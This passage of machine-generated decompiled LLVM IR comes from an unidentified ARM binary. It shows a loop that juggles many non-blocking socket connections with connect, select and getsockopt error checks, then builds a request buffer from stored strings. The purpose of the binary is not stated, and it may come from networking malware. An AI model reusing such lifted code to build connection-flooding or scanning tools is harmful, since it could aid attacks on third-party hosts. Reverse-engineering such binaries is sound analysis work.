  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9400 = load i32, i32* %sb.global-to-local, align 4
  %v1_9400 = load i32, i32* @r6, align 4
  %v2_9400 = add i32 %v1_9400, -1423
  %v3_9400 = inttoptr i32 %v2_9400 to i32*
  store i32 %v0_9400, i32* %v3_9400, align 4
  %v5_9404 = call i32 @connect(i32 %v3_93d4, %sockaddr* nonnull %tmp209, i32 16)
  store i32 %v5_9404, i32* %r0.global-to-local, align 4
  %v0_9408 = load i32, i32* @r6, align 4
  %v1_9408 = add i32 %v0_9408, -1431
  %v2_9408 = inttoptr i32 %v1_9408 to i32*
  %v3_9408 = load i32, i32* %v2_9408, align 4
  store i32 %v3_9408, i32* %r0.global-to-local, align 4
  %v3_9410 = udiv i32 %v3_9408, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9414 = mul nuw nsw i32 %v3_9410, 4
  store i32 %v3_9414, i32* %r3.global-to-local, align 4
  store i32 %v2_9418, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_9420

dec_label_pc_9420:                                ; preds = %dec_label_pc_9a48, %dec_label_pc_9378
  %v1_942c = phi i32 [ %v3_9408, %dec_label_pc_9378 ], [ %v3_9a48, %dec_label_pc_9a48 ]
  %v3_9414.pn = phi i32 [ %v3_9414, %dec_label_pc_9378 ], [ %v3_9a54, %dec_label_pc_9a48 ]
  %storemerge = add i32 %v3_9414.pn, %v2_9418
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_9420 = add i32 %storemerge, -292
  %v2_9420 = inttoptr i32 %v1_9420 to i32*
  %v3_9420 = load i32, i32* %v2_9420, align 4
  %v1_9424 = urem i32 %v1_942c, 32
  store i32 %v1_9424, i32* %r1.global-to-local, align 4
  %v1_9428 = load i32, i32* %fp.global-to-local, align 4
  %v7_9428 = shl i32 %v1_9428, %v1_9424
  %v8_9428 = or i32 %v7_9428, %v3_9420
  store i32 %v8_9428, i32* %r2.global-to-local, align 4
  %v0_942c = load i32, i32* @sl, align 4
  %v2_942c = sub i32 %v0_942c, %v1_942c
  %v3_942c = icmp uge i32 %v0_942c, %v1_942c
  store i1 %v3_942c, i1* %cpsr_c.global-to-local, align 1
  %v4_942c = xor i32 %v0_942c, %v1_942c
  %v5_942c = xor i32 %v2_942c, %v0_942c
  %v6_942c = and i32 %v5_942c, %v4_942c
  %v7_942c = icmp slt i32 %v6_942c, 0
  store i1 %v7_942c, i1* %cpsr_v.global-to-local, align 1
  %v8_942c = icmp slt i32 %v2_942c, 0
  store i1 %v8_942c, i1* %cpsr_n.global-to-local, align 1
  %v9_942c = icmp eq i32 %v0_942c, %v1_942c
  store i1 %v9_942c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9428, i32* %v2_9420, align 4
  %v2_9434 = xor i1 %v8_942c, %v7_942c
  br i1 %v2_9434, label %dec_label_pc_9438, label %dec_label_pc_9300

dec_label_pc_9438:                                ; preds = %dec_label_pc_9420
  %v0_9438 = load i32, i32* %r0.global-to-local, align 4
  %v1_9438 = add i32 %v0_9438, 1
  store i32 %v1_9438, i32* @sl, align 4
  br label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_9a30, %dec_label_pc_99f8, %dec_label_pc_9438
  %v0_945c99 = phi i32 [ %v1_9a30, %dec_label_pc_9a30 ], [ %v1_99f8, %dec_label_pc_99f8 ], [ %v1_9438, %dec_label_pc_9438 ]
  store i32 %v0_906c, i32* %lr.global-to-local, align 4
  %v0_9440 = load i32, i32* @r8, align 4
  %v1_9440 = add i32 %v0_9440, 1
  store i32 %v1_9440, i32* @r8, align 4
  %v0_9444 = load i32, i32* @r7, align 4
  %v0_9448 = load i32, i32* @r6, align 4
  %v2_944c = sub i32 %v0_906c, %v1_9440
  %v3_944c = icmp uge i32 %v0_906c, %v1_9440
  store i1 %v3_944c, i1* %cpsr_c.global-to-local, align 1
  %v4_944c = xor i32 %v1_9440, %v0_906c
  %v5_944c = xor i32 %v2_944c, %v0_906c
  %v6_944c = and i32 %v5_944c, %v4_944c
  %v7_944c = icmp slt i32 %v6_944c, 0
  store i1 %v7_944c, i1* %cpsr_v.global-to-local, align 1
  %v8_944c = icmp slt i32 %v2_944c, 0
  store i1 %v8_944c, i1* %cpsr_n.global-to-local, align 1
  %v9_944c = icmp eq i32 %v0_906c, %v1_9440
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  %v1_9450 = add i32 %v0_9444, 3140
  store i32 %v1_9450, i32* @r7, align 4
  %v1_9454 = add i32 %v0_9448, 3140
  store i32 %v1_9454, i32* @r6, align 4
  br i1 %v9_944c, label %dec_label_pc_945c, label %dec_label_pc_9320

dec_label_pc_945c:                                ; preds = %dec_label_pc_943c, %dec_label_pc_9300.dec_label_pc_945c_crit_edge
  %v0_9494 = phi i32 [ %v0_945c.pre, %dec_label_pc_9300.dec_label_pc_945c_crit_edge ], [ %v0_945c99, %dec_label_pc_943c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_945c = icmp slt i32 %v0_9494, 0
  store i1 %v1_945c, i1* %cpsr_n.global-to-local, align 1
  %v2_945c = icmp eq i32 %v0_9494, 0
  store i1 %v2_945c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_945c, label %dec_label_pc_91f8, label %dec_label_pc_9464

dec_label_pc_9464:                                ; preds = %dec_label_pc_945c
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_9484, i32* %ip.global-to-local, align 4
  store i32 %v2_9488, i32* %r1.global-to-local, align 4
  store i32 %v2_948c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_9494, i32* %r0.global-to-local, align 4
  %v13_949c = call i32 @select(i32 %v0_9494, %_TYPEDEF_fd_set* %tmp210, %_TYPEDEF_fd_set* %tmp211, %_TYPEDEF_fd_set* null, %timeval* %tmp212)
  store i32 %v13_949c, i32* @r4, align 4
  %v0_94a4 = load i32, i32* @r5, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v1_94a8 = inttoptr i32 %v0_94a4 to i32*
  %v2_94a8 = call i32 @time(i32* %v1_94a8)
  store i32 %v2_94a8, i32* %r0.global-to-local, align 4
  %v0_94ac = load i32, i32* @r4, align 4
  %v1_94ac = load i32, i32* @r5, align 4
  %v2_94ac = sub i32 %v0_94ac, %v1_94ac
  %v3_94ac = icmp uge i32 %v0_94ac, %v1_94ac
  store i1 %v3_94ac, i1* %cpsr_c.global-to-local, align 1
  %v4_94ac = xor i32 %v1_94ac, %v0_94ac
  %v5_94ac = xor i32 %v2_94ac, %v0_94ac
  %v6_94ac = and i32 %v5_94ac, %v4_94ac
  %v7_94ac = icmp slt i32 %v6_94ac, 0
  store i1 %v7_94ac, i1* %cpsr_v.global-to-local, align 1
  %v8_94ac = icmp slt i32 %v2_94ac, 0
  store i1 %v8_94ac, i1* %cpsr_n.global-to-local, align 1
  %v9_94ac = icmp eq i32 %v0_94ac, %v1_94ac
  store i1 %v9_94ac, i1* %cpsr_z.global-to-local, align 1
  %v7_94b4 = icmp sgt i32 %v0_94ac, %v1_94ac
  br i1 %v7_94b4, label %dec_label_pc_94b8, label %dec_label_pc_91f8

dec_label_pc_94b8:                                ; preds = %dec_label_pc_9464
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_9528

dec_label_pc_94c4:                                ; preds = %.thread39.dec_label_pc_94c4_crit_edge, %dec_label_pc_9538
  %v0_94dc = phi i32 [ %v0_94c4.pre, %.thread39.dec_label_pc_94c4_crit_edge ], [ %v3_9528, %dec_label_pc_9538 ]
  %v3_94c4 = udiv i32 %v0_94dc, 32
  store i32 %v2_9418, i32* %r2.global-to-local, align 4
  %v3_94d0 = mul nuw nsw i32 %v3_94c4, 4
  %v2_94d4 = add i32 %v3_94d0, %v2_9418
  store i32 %v2_94d4, i32* %r3.global-to-local, align 4
  %v1_94d8 = add i32 %v2_94d4, -164
  %v2_94d8 = inttoptr i32 %v1_94d8 to i32*
  %v3_94d8 = load i32, i32* %v2_94d8, align 4
  %v1_94dc = urem i32 %v0_94dc, 32
  store i32 %v1_94dc, i32* %r1.global-to-local, align 4
  %v2_94e0 = add nsw i32 %v1_94dc, -1
  %v3_94e0 = shl i32 1, %v2_94e0
  %v4_94e0 = and i32 %v3_94e0, %v3_94d8
  %v5_94e0 = icmp ne i32 %v4_94e0, 0
  store i1 %v5_94e0, i1* %cpsr_c.global-to-local, align 1
  %v6_94e0 = lshr i32 %v3_94d8, %v1_94dc
  store i32 %v6_94e0, i32* %r2.global-to-local, align 4
  %v1_94e4 = urem i32 %v6_94e0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_94e4 = icmp eq i32 %v1_94e4, 0
  store i1 %v2_94e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94e4, label %dec_label_pc_9508, label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94c4
  %v0_94ec = load i32, i32* @r8, align 4
  %v1_94ec = add i32 %v0_94ec, -1452
  %v2_94ec = inttoptr i32 %v1_94ec to i8*
  %v3_94ec = load i8, i8* %v2_94ec, align 1
  %v4_94ec = zext i8 %v3_94ec to i32
  store i32 %v4_94ec, i32* %r3.global-to-local, align 4
  %v2_94f0 = icmp ugt i8 %v3_94ec, 5
  store i1 %v2_94f0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_94f0 = icmp ult i8 %v3_94ec, 6
  store i1 %v6_94f0, i1* %cpsr_n.global-to-local, align 1
  %v7_94f0 = icmp eq i8 %v3_94ec, 6
  store i1 %v7_94f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94f0, label %dec_label_pc_9aa0, label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94ec
  %v2_94f8 = icmp ugt i8 %v3_94ec, 6
  store i1 %v2_94f8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_94f8 = icmp ult i8 %v3_94ec, 7
  store i1 %v6_94f8, i1* %cpsr_n.global-to-local, align 1
  %v7_94f8 = icmp eq i8 %v3_94ec, 7
  store i1 %v7_94f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94f8, label %dec_label_pc_a0dc, label %dec_label_pc_9500

dec_label_pc_9500:                                ; preds = %dec_label_pc_94f8
  %v2_9500 = icmp ugt i8 %v3_94ec, 9
  store i1 %v2_9500, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9500 = icmp ult i8 %v3_94ec, 10
  store i1 %v6_9500, i1* %cpsr_n.global-to-local, align 1
  %v7_9500 = icmp eq i8 %v3_94ec, 10
  store i1 %v7_9500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9500, label %dec_label_pc_a2ec, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_a1e0, %dec_label_pc_a620, %dec_label_pc_a768, %dec_label_pc_a5e4, %dec_label_pc_9500, %dec_label_pc_94c4, %dec_label_pc_9528, %dec_label_pc_aa54, %dec_label_pc_a804, %dec_label_pc_a74c, %dec_label_pc_a604, %dec_label_pc_a5cc, %dec_label_pc_a554, %dec_label_pc_a32c, %dec_label_pc_95ac, %dec_label_pc_a0d0
  store i32 %v0_906c, i32* %r3.global-to-local, align 4
  %v1_9510 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_9510, i32* %r2.global-to-local, align 4
  %v0_9514 = load i32, i32* @r8, align 4
  %v2_9518 = sub i32 %v1_9510, %v0_906c
  %v3_9518 = icmp uge i32 %v1_9510, %v0_906c
  store i1 %v3_9518, i1* %cpsr_c.global-to-local, align 1
  %v4_9518 = xor i32 %v1_9510, %v0_906c
  %v5_9518 = xor i32 %v2_9518, %v1_9510
  %v6_9518 = and i32 %v5_9518, %v4_9518
  %v7_9518 = icmp slt i32 %v6_9518, 0
  store i1 %v7_9518, i1* %cpsr_v.global-to-local, align 1
  %v8_9518 = icmp slt i32 %v2_9518, 0
  store i1 %v8_9518, i1* %cpsr_n.global-to-local, align 1
  %v9_9518 = icmp eq i32 %v1_9510, %v0_906c
  store i1 %v9_9518, i1* %cpsr_z.global-to-local, align 1
  %v1_9520 = add i32 %v0_9514, 3140
  store i32 %v1_9520, i32* @r8, align 4
  br i1 %v9_9518, label %dec_label_pc_91f8, label %dec_label_pc_9528

dec_label_pc_9528:                                ; preds = %dec_label_pc_9508, %dec_label_pc_94b8
  %v0_9530 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_94b8 ], [ %v1_9520, %dec_label_pc_9508 ]
  %stack_var_-20832.0 = phi i32 [ %v1_94ac, %dec_label_pc_94b8 ], [ %v1_9510, %dec_label_pc_9508 ]
  %v1_9528 = add i32 %v0_9530, -1456
  %v2_9528 = inttoptr i32 %v1_9528 to i32*
  %v3_9528 = load i32, i32* %v2_9528, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_952c = add i32 %v3_9528, 1
  %v2_952c = icmp eq i32 %v3_9528, -1
  store i1 %v2_952c, i1* %cpsr_c.global-to-local, align 1
  %v3_952c = sub i32 0, %v3_9528
  %v4_952c = and i32 %v1_952c, %v3_952c
  %v5_952c = icmp slt i32 %v4_952c, 0
  store i1 %v5_952c, i1* %cpsr_v.global-to-local, align 1
  %v6_952c = icmp slt i32 %v1_952c, 0
  store i1 %v6_952c, i1* %cpsr_n.global-to-local, align 1
  %v7_952c = icmp eq i32 %v1_952c, 0
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9528, i32* %sb.global-to-local, align 4
  br i1 %v7_952c, label %dec_label_pc_9508, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %dec_label_pc_9528
  %v3_9538 = udiv i32 %v3_9528, 32
  %v3_9540 = mul nuw nsw i32 %v3_9538, 4
  store i32 %v2_9418, i32* %lr.global-to-local, align 4
  %v2_9548 = add i32 %v3_9540, %v2_9418
  store i32 %v2_9548, i32* %r3.global-to-local, align 4
  %v1_954c = add i32 %v2_9548, -292
  %v2_954c = inttoptr i32 %v1_954c to i32*
  %v3_954c = load i32, i32* %v2_954c, align 4
  %v1_9550 = urem i32 %v3_9528, 32
  store i32 %v1_9550, i32* %r1.global-to-local, align 4
  %v2_9554 = add nsw i32 %v1_9550, -1
  %v3_9554 = shl i32 1, %v2_9554
  %v4_9554 = and i32 %v3_954c, %v3_9554
  %v5_9554 = icmp ne i32 %v4_9554, 0
  store i1 %v5_9554, i1* %cpsr_c.global-to-local, align 1
  %v6_9554 = lshr i32 %v3_954c, %v1_9550
  store i32 %v6_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = urem i32 %v6_9554, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9558 = icmp eq i32 %v1_9558, 0
  store i1 %v2_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9558, label %dec_label_pc_94c4, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  store i32 4, i32* @r4, align 4
  store i32 %v10_8fc0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_9578, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_9584, i32* %lr.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v8_9590 = call i32 @getsockopt(i32 %v3_9528, i32 1, i32 4, i32* nonnull %stack_var_-44, i32* nonnull %stack_var_-48)
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_9598 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9598, i32* %r3.global-to-local, align 4
  %v2_959c = or i32 %v3_9598, %v8_9590
  store i32 %v2_959c, i32* %r0.global-to-local, align 4
  %v3_959c = icmp slt i32 %v2_959c, 0
  store i1 %v3_959c, i1* %cpsr_n.global-to-local, align 1
  %v4_959c = icmp eq i32 %v2_959c, 0
  store i1 %v4_959c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_959c, label %.thread39, label %dec_label_pc_95ac

.thread39:                                        ; preds = %dec_label_pc_9560
  %v1_95a0 = load i32, i32* @r8, align 4
  %v2_95a0 = add i32 %v1_95a0, -1456
  %v3_95a0 = inttoptr i32 %v2_95a0 to i32*
  %v4_95a0 = load i32, i32* %v3_95a0, align 4
  store i32 %v4_95a0, i32* %r0.global-to-local, align 4
  %v1_95a4 = load i32, i32* @r4, align 4
  %v2_95a4 = trunc i32 %v1_95a4 to i8
  %v4_95a4 = add i32 %v1_95a0, -1452
  %v5_95a4 = inttoptr i32 %v4_95a4 to i8*
  store i8 %v2_95a4, i8* %v5_95a4, align 1
  %v0_95a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_95a8.pr.pr, label %.thread39.dec_label_pc_94c4_crit_edge, label %dec_label_pc_95ac

.thread39.dec_label_pc_94c4_crit_edge:            ; preds = %.thread39
  %v0_94c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_94c4

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9560, %.thread39
  %v0_95ac = load i32, i32* @r8, align 4
  %v1_95ac = add i32 %v0_95ac, -1456
  %v2_95ac = inttoptr i32 %v1_95ac to i32*
  %v3_95ac = load i32, i32* %v2_95ac, align 4
  store i32 %v3_95ac, i32* %r0.global-to-local, align 4
  %v1_95b0 = call i32 @close(i32 %v3_95ac)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_95b8 = load i32, i32* @r8, align 4
  %v2_95b8 = add i32 %v1_95b8, -1456
  %v3_95b8 = inttoptr i32 %v2_95b8 to i32*
  store i32 -1, i32* %v3_95b8, align 4
  %v0_95bc = load i32, i32* @r5, align 4
  %v1_95bc = trunc i32 %v0_95bc to i8
  %v2_95bc = load i32, i32* @r8, align 4
  %v3_95bc = add i32 %v2_95bc, -1452
  %v4_95bc = inttoptr i32 %v3_95bc to i8*
  store i8 %v1_95bc, i8* %v4_95bc, align 1
  br label %dec_label_pc_9508

dec_label_pc_95c4:                                ; preds = %dec_label_pc_9320
  %v1_95c4 = add i32 %v3_95d0, 25
  %v2_95c4 = inttoptr i32 %v1_95c4 to i32*
  %v3_95c4 = load i32, i32* %v2_95c4, align 4
  store i32 %v3_95c4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_95c8 = icmp slt i32 %v3_95c4, 0
  store i1 %v1_95c8, i1* %cpsr_n.global-to-local, align 1
  %v2_95c8 = icmp eq i32 %v3_95c4, 0
  store i1 %v2_95c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95c8, label %.thread44, label %.thread42

.thread42:                                        ; preds = %dec_label_pc_95c4
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_9320, align 1
  %v0_95d4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_95d4.pr.pr, label %.thread42..thread44_crit_edge, label %dec_label_pc_95dc

.thread42..thread44_crit_edge:                    ; preds = %.thread42
  %v1_95d4.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_95d4.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_95d4.pre to i8
  br label %.thread44

.thread44:                                        ; preds = %.thread42..thread44_crit_edge, %dec_label_pc_95c4
  %v3_95d4 = phi i32 [ %v3_95d4.pre, %.thread42..thread44_crit_edge ], [ %v3_95d0, %dec_label_pc_95c4 ]
  %v1_95d4.off0 = phi i8 [ %extract.t, %.thread42..thread44_crit_edge ], [ 0, %dec_label_pc_95c4 ]
  %v4_95d4 = add i32 %v3_95d4, -1427
  %v5_95d4 = inttoptr i32 %v4_95d4 to i8*
  store i8 %v1_95d4.off0, i8* %v5_95d4, align 1
  %v0_95d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_95d8.pr, label %.thread44.dec_label_pc_9334_crit_edge, label %dec_label_pc_95dc

.thread44.dec_label_pc_9334_crit_edge:            ; preds = %.thread44
  %v0_9334.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9334

dec_label_pc_95dc:                                ; preds = %.thread42, %.thread44, %dec_label_pc_9290
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_95e4 = load i32, i32* @r7, align 4
  %v1_95e4 = add i32 %v0_95e4, 2112
  store i32 %v1_95e4, i32* %r0.global-to-local, align 4
  %v1_95e8 = load i32, i32* @r6, align 4
  %v2_95e8 = add i32 %v1_95e8, 33
  %v3_95e8 = inttoptr i32 %v2_95e8 to i32*
  store i32 -1, i32* %v3_95e8, align 4
  %v0_95ec = load i32, i32* %r0.global-to-local, align 4
  %v1_95ec = add i32 %v0_95ec, 4
  store i32 %v1_95ec, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_95f4 = load i32, i32* @r5, align 4
  %v1_95f4 = load i32, i32* @r6, align 4
  %v2_95f4 = add i32 %v1_95f4, 21
  %v3_95f4 = inttoptr i32 %v2_95f4 to i32*
  store i32 %v0_95f4, i32* %v3_95f4, align 4
  %v2_95f8 = call i32 @function_12dd4(i32 %v1_95ec, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_9604 = load i32, i32* @r5, align 4
  %v1_9604 = load i32, i32* @r6, align 4
  %v2_9604 = add i32 %v1_9604, 681
  %v3_9604 = inttoptr i32 %v2_9604 to i32*
  store i32 %v0_9604, i32* %v3_9604, align 4
  %v2_9608 = call i32 @function_12dd4(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9610 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_9618 = load i32, i32* @r6, align 4
  store i32 %v0_9618, i32* %r1.global-to-local, align 4
  %v2_961c = add i32 %v2_9610, %stack_var_-20856.0.ph
  store i32 %v2_961c, i32* @r0, align 4
  %v2_9620 = inttoptr i32 %v2_961c to i8*
  %v3_9620 = call i32 @function_12d5c(i8* %v2_9620, i32 %v0_9618)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9628 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1368c.80 to i32), i32* %r1.global-to-local, align 4
  %v2_9634 = add i32 %v2_9628, %stack_var_-20856.0.ph
  store i32 %v2_9634, i32* @r0, align 4
  %v2_9638 = inttoptr i32 %v2_9634 to i8*
  %v3_9638 = call i32 @function_12d5c(i8* %v2_9638, i32 ptrtoint (i32* @global_var_1368c.80 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9640 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_9648 = load i32, i32* @r7, align 4
  %v1_9648 = add i32 %v0_9648, 532
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  %v2_964c = add i32 %v2_9640, %stack_var_-20856.0.ph
  store i32 %v2_964c, i32* @r0, align 4
  %v2_9650 = inttoptr i32 %v2_964c to i8*
  %v3_9650 = call i32 @function_12d5c(i8* %v2_9650, i32 %v1_9648)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9658 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_13664.82 to i32), i32* %r1.global-to-local, align 4
  %v2_9664 = add i32 %v2_9658, %stack_var_-20856.0.ph
  store i32 %v2_9664, i32* @r0, align 4
  %v3_9668 = inttoptr i32 %v2_9664 to i8*
  %v4_9668 = call i32 @function_12d5c(i8* %v3_9668, i32 ptrtoint ([24 x i8]* @global_var_13664.82 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9670 = call i32 @function_12d34(i8* %v1_9610)
  %v2_9678 = add i32 %v2_9670, %stack_var_-20856.0.ph
  store i32 %v2_9678, i32* @r0, align 4
  %v0_967c = load i32, i32* @r7, align 4
  %v1_967c = add i32 %v0_967c, 20
  store i32 %v1_967c, i32* %r1.global-to-local, align 4
  %v2_9680 = inttoptr i32 %v2_9678 to i8*
  %v3_9680 = call i32 @function_12d5c(i8* %v2_9680, i32 %v1_967c)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9688 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1367c.84 to i32), i32* %r1.global-to-local, align 4
  %v2_9694 = add i32 %v2_9688, %stack_var_-20856.0.ph
  store i32 %v2_9694, i32* @r0, align 4
  %v3_9698 = inttoptr i32 %v2_9694 to i8*
  %v4_9698 = call i32 @function_12d5c(i8* %v3_9698, i32 ptrtoint ([9 x i8]* @global_var_1367c.84 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96a0 = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_96a8 = load i32, i32* @r7, align 4
  %v2_96ac = add i32 %v2_96a0, %stack_var_-20856.0.ph
  store i32 %v2_96ac, i32* @r0, align 4
  %v1_96b0 = add i32 %v0_96a8, 789
  store i32 %v1_96b0, i32* %r1.global-to-local, align 4
  %v2_96b4 = inttoptr i32 %v2_96ac to i8*
  %v3_96b4 = call i32 @function_12d5c(i8* %v2_96b4, i32 %v1_96b0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96bc = call i32 @function_12d34(i8* %v1_9610)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_96c8 = add i32 %v2_96bc, %stack_var_-20856.0.ph
  store i32 %v2_96c8, i32* @r0, align 4
  %v2_96cc = inttoptr i32 %v2_96c8 to i8*
  %v3_96cc = call i32 @function_12d5c(i8* %v2_96cc, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_96d4 = call i32 @function_12280(i32 39)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96dc = call i32 @function_12d34(i8* %v1_9610)
  %v0_96e0 = load i32, i32* @r5, align 4
  store i32 %v0_96e0, i32* %r1.global-to-local, align 4
  store i32 %v2_96dc, i32* @r4, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_96ec = inttoptr i32 %v0_96e0 to i32*
  %v3_96ec = call i32 @function_1219c(i32 39, i32* %v2_96ec)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_96ec, i32* %r1.global-to-local, align 4
  %v1_96f8 = load i32, i32* @r4, align 4
  %v2_96f8 = add i32 %v1_96f8, %stack_var_-20856.0.ph
  store i32 %v2_96f8, i32* @r0, align 4
  %v2_96fc = inttoptr i32 %v2_96f8 to i8*
  %v3_96fc = call i32 @function_12d5c(i8* %v2_96fc, i32 %v3_96ec)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_9704 = call i32 @function_121c8(i32 39)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_970c = call i32 @function_12d34(i8* %v1_9610)
  %v2_9714 = add i32 %v2_970c, %stack_var_-20856.0.ph
  store i32 %v2_9714, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  %v2_971c = inttoptr i32 %v2_9714 to i8*
  %v3_971c = call i32 @function_12d5c(i8* %v2_971c, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32))
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_9724 = call i32 @function_12280(i32 40)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_972c = call i32 @function_12d34(i8* %v1_9610)
  %v0_9730 = load i32, i32* @r5, align 4
  store i32 %v0_9730, i32* %r1.global-to-local, align 4
  store i32 %v2_972c, i32* @r4, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_973c = inttoptr i32 %v0_9730 to i32*
  %v3_973c = call i32 @function_1219c(i32 40, i32* %v2_973c)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_973c, i32* %r1.global-to-local, align 4
  %v1_9748 = load i32, i32* @r4, align 4
  %v2_9748 = add i32 %v1_9748, %stack_var_-20856.0.ph
  store i32 %v2_9748, i32* @r0, align 4
  %v2_974c = inttoptr i32 %v2_9748 to i8*
  %v3_974c = call i32 @function_12d5c(i8* %v2_974c, i32 %v3_973c)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_9754 = call i32 @function_121c8(i32 40)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
